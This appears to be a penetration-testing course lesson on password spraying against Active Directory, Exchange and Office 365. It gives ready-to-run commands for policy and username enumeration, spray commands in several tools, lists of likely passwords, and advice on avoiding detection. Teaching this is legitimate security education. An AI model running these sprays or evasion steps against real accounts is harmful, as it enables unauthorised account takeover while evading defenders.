# Password Spraying

## Unit 3 - Topic 3 | Initial Access Scenarios

---

## Overview

**Password spraying** tests a small number of common passwords against many user accounts simultaneously. Unlike brute force (many passwords against one account), spraying avoids account lockouts by staying below the lockout threshold.

---

## 1. Password Spraying Strategy

```
SPRAYING vs BRUTE FORCE:

BRUTE FORCE (BAD for AD):
├── Many passwords → 1 account
├── user1: pass1, pass2, pass3... pass1000
├── Triggers lockout (usually 3-5 attempts)
└── Very noisy, easily detected

PASSWORD SPRAYING (PREFERRED):
├── 1 password → Many accounts
├── All users: "Spring2024!"
├── Wait for lockout window to reset
├── Try next password: "Welcome1!"
└── Stays under lockout threshold

WORKFLOW:
1. Enumerate password policy
   └── Lockout threshold, observation window, reset time
2. Enumerate valid usernames
   └── Kerbrute, LDAP, OSINT
3. Select spray passwords
   └── Season+Year!, Company+123!, Welcome1!
4. Spray ONE password at a time
5. Wait for lockout window to reset
6. Repeat with next password
```

---

## 2. Pre-Spray Reconnaissance

```bash
# === STEP 1: GET PASSWORD POLICY ===
# CrackMapExec:
crackmapexec smb dc01 -u user -p pass --pass-pol
# Shows: Lockout threshold, lockout duration, observation window

# Net commands (if on domain):
net accounts /domain
# Shows: Lockout threshold, Lockout duration

# PowerView:
(Get-DomainPolicy).SystemAccess

# LDAP:
ldapsearch -x -H ldap://dc01 -D "user@corp.local" -w pass \
  -b "DC=corp,DC=local" -s base "(objectClass=*)" \
  lockoutThreshold lockoutDuration lockOutObservationWindow

# KEY VALUES:
# Lockout Threshold: 5    → Can try 4 passwords safely
# Observation Window: 30  → Wait 30 min between sprays
# Lockout Duration: 30    → Locked for 30 min after threshold

# === STEP 2: ENUMERATE VALID USERS ===
# Kerbrute (Kerberos-based, stealthy):
kerbrute userenum -d corp.local --dc dc01 userlist.txt
# Valid users respond differently than invalid

# CrackMapExec:
crackmapexec smb dc01 -u userlist.txt -p '' --no-bruteforce
# Checks which usernames are valid

# OSINT: LinkedIn, company website, email harvesting
# Common format: first.last, flast, firstl
```

---

## 3. Spraying Tools and Commands

```bash
# === CRACKMAPEXEC (Recommended) ===
# Single password against user list:
crackmapexec smb dc01 -u users.txt -p 'Spring2024!' \
  --no-bruteforce

# Multiple passwords (careful - respects lockout):
crackmapexec smb dc01 -u users.txt -p passwords.txt \
  --no-bruteforce

# === KERBRUTE (Kerberos-based, stealthier) ===
kerbrute passwordspray -d corp.local --dc dc01 \
  users.txt 'Spring2024!'
# Uses Kerberos pre-auth → fewer logs than SMB

# === SPRAY (DomainPasswordSpray.ps1) ===
# From Windows:
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2024!' \
  -UserList .\users.txt -Domain corp.local

# Auto-gathers users and respects policy:
Invoke-DomainPasswordSpray -Password 'Spring2024!'
# Automatically gets users from AD and checks lockout policy

# === SPRAYHOUND ===
# Sprays and updates BloodHound:
sprayhound -U users.txt -p 'Spring2024!' \
  -d corp.local -dc dc01

# === RULER (Exchange/Outlook) ===
# Spray against Exchange:
ruler --domain corp.local -u users.txt brute \
  --passwords passwords.txt --delay 30

# === O365 SPRAYING (MSOLSpray) ===
# For cloud/hybrid environments:
Invoke-MSOLSpray -UserList users.txt \
  -Password 'Spring2024!' -URL https://login.microsoftonline.com
```

---

## 4. Common Spray Passwords

```
HIGH-SUCCESS PASSWORDS:

SEASON + YEAR:
├── Spring2024!
├── Summer2024!
├── Winter2024!
├── Fall2024!
└── Season year matches when password was last reset

COMPANY-RELATED:
├── CompanyName1!
├── Company2024!
├── Welcome1!
├── Password1!
└── Corp123!

COMMON PATTERNS:
├── Month + Year: January2024!
├── Day + Month: Monday1!
├── Sports teams: TeamName1!
├── City names: CityName2024!
└── Keyboard patterns: Qwerty123!

PASSWORD GENERATION:
# Create targeted wordlist:
# 1. Get company name, location, mascot
# 2. Combine with: numbers (1,123,2024), special (!,@,#)
# 3. Capitalize first letter
# 4. Add current year/season
```

---

## 5. Spray Safety and Evasion

```
SAFE SPRAYING RULES:

1. ALWAYS check password policy FIRST
   └── Know the lockout threshold!

2. NEVER spray more than (threshold - 1) times
   └── Threshold=5 → max 4 attempts per reset window

3. WAIT between spray rounds
   └── Wait at least the observation window duration

4. START with ONE password
   └── If 0 hits, wait, try next

5. MONITOR for lockouts
   └── Test with a few accounts first

6. USE KERBEROS over SMB
   └── Kerbrute generates fewer logs

7. DISTRIBUTED SPRAYING
   └── Spray from multiple IPs if possible

8. TIME your sprays
   └── During business hours (blends with normal auth)
   └── Monday morning = many real auth failures

EVASION:
├── Use Kerberos (not SMB/LDAP) → fewer event logs
├── Spray during high-traffic periods
├── Use jitter/randomization between attempts
├── Target specific users, not all users
└── Check for honeypot accounts first
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Spraying** | 1 password → many users (avoids lockout) |
| **First step** | Always check password policy first |
| **Best tool** | Kerbrute (Kerberos, stealthier) |
| **Common passwords** | Season+Year!, Company+Number! |
| **Safety rule** | Stay below lockout threshold |
| **Wait time** | Observation window between spray rounds |

---

## Quick Revision Questions

1. **How does password spraying differ from brute force?**
2. **Why must you check the password policy before spraying?**
3. **Why is Kerbrute preferred over SMB-based spraying?**
4. **What are the most common spray password patterns?**
5. **How do you calculate the safe number of spray attempts?**

---

[← Previous: Phishing for Credentials](02-phishing-for-credentials.md) | [Next: LLMNR/NBT-NS Poisoning →](04-llmnr-nbns-poisoning.md)

---

*Unit 3 - Topic 3 of 6 | [Back to README](../README.md)*
